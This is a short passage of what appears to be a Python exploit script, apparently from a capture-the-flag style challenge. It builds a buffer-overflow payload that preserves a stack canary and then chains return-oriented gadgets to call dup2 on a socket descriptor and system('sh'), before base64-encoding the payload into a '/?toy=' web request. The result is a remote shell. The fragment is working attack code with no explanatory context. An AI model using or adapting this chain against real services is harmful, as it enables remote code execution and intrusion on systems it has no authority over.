...
overflow+=p64(canary)+p64(0xdeadbeef)+p64(gadget1)+p64(4)+p64(gadget2)+p64(0)+p64(0xdeadbeef)+p64(dup2)+p64(gadget1)+p64(4)+p64(gadget2)+p64(1)+p64(0xdeadbeef)+p64(dup2)+p64(gadget1)+p64(sh)+p64(system)
toy=base64.b64encode(overflow)
path="/?toy="+toy
